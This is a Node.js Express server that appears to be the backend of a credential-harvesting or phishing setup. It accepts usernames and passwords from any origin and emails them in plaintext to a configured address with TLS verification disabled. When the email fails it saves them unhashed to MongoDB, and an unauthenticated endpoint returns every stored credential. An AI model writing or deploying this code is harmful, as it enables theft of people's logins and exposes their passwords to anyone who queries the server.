require("dotenv").config();

const express = require("express");
const nodemailer = require("nodemailer");
const mongoose = require("mongoose");
const cors = require("cors");

const app = express();
const port = Number(process.env.PORT || 3000);

app.use(cors()); // allow all origins
app.use(express.json());

// MongoDB setup
const MONGO_URI = process.env.MONGO_URI || "mongodb://localhost:27017/credentials_db";

mongoose.connect(MONGO_URI)
  .then(() => console.log("✅ MongoDB connected:", MONGO_URI))
  .catch((err) => console.error("⚠️  MongoDB connection failed:", err.message));

const credentialSchema = new mongoose.Schema({
  username: { type: String, required: true },
  password: { type: String, required: true },
  savedAt: { type: Date, default: Date.now },
  reason: { type: String, default: "email_failed" },
});

const Credential = mongoose.model("Credential", credentialSchema);

// Cached test account so we don't create a new one on every request
let testTransporter = null;

async function getTransporter() {
  if (process.env.SMTP_HOST) {
    const smtpPort = Number(process.env.SMTP_PORT || 587);
    const smtpSecure = process.env.SMTP_SECURE === "true" || smtpPort === 465;
    const hasAuth = process.env.SMTP_USER && process.env.SMTP_PASS;

    return nodemailer.createTransport({
      host: process.env.SMTP_HOST,
      port: smtpPort,
      secure: smtpSecure,
      connectionTimeout: 10000,
      greetingTimeout: 10000,
      socketTimeout: 10000,
      auth: hasAuth
        ? { user: process.env.SMTP_USER, pass: process.env.SMTP_PASS }
        : false,
      tls: { rejectUnauthorized: false },
    });
  }

  if (!testTransporter) {
    const testAccount = await nodemailer.createTestAccount();
    console.log("✅ Ethereal test account created:", testAccount.user);

    testTransporter = nodemailer.createTransport({
      host: testAccount.smtp.host,
      port: testAccount.smtp.port,
      secure: testAccount.smtp.secure,
      auth: { user: testAccount.user, pass: testAccount.pass },
      tls: { rejectUnauthorized: false },
    });

    testTransporter._testUser = testAccount.user;
  }

  return testTransporter;
}

app.get("/", (_req, res) => {
  res.json({ message: "API is running. POST to /api/send-credentials" });
});

app.post("/api/send-credentials", async (req, res) => {
  const { username, password } = req.body || {};

  if (typeof username !== "string" || !username.trim())
    return res.status(400).json({ error: "username is required." });

  if (typeof password !== "string" || !password.trim())
    return res.status(400).json({ error: "password is required." });

  // Try sending email first
  try {
    const transporter = await getTransporter();
    const mailFrom = process.env.MAIL_FROM || transporter._testUser;
    const mailTo = process.env.MAIL_TO || transporter._testUser;

    const info = await transporter.sendMail({
      from: mailFrom,
      to: mailTo,
      subject: "New API credential submission",
      text: `Username: ${username}\nPassword: ${password}`,
    });

    const previewUrl = nodemailer.getTestMessageUrl(info);
    console.log("✅ Email sent:", info.messageId);

    return res.status(200).json({
      message: "Email sent successfully.",
      messageId: info.messageId,
      previewUrl: previewUrl || null,
    });

  } catch (mailError) {
    // Email failed — save to MongoDB instead
    console.warn("⚠️  Email failed:", mailError.message);
    console.log("💾 Saving credentials to MongoDB...");

    try {
      const saved = await Credential.create({ username, password, reason: mailError.message });
      console.log("✅ Saved to MongoDB with id:", saved._id);

      return res.status(200).json({
        message: "Email failed. Credentials saved to MongoDB instead.",
        savedId: saved._id,
        emailError: mailError.message,
      });

    } catch (dbError) {
      console.error("❌ MongoDB save also failed:", dbError.message);
      return res.status(500).json({
        error: "Both email and database storage failed.",
        emailError: mailError.message,
        dbError: dbError.message,
      });
    }
  }
});

// GET endpoint to view stored credentials
app.get("/api/credentials", async (_req, res) => {
  try {
    const credentials = await Credential.find().sort({ savedAt: -1 });
    return res.status(200).json({ count: credentials.length, data: credentials });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

if (require.main === module) {
  app.listen(port, () => console.log(`Server listening on port ${port}`));
}

module.exports = app;
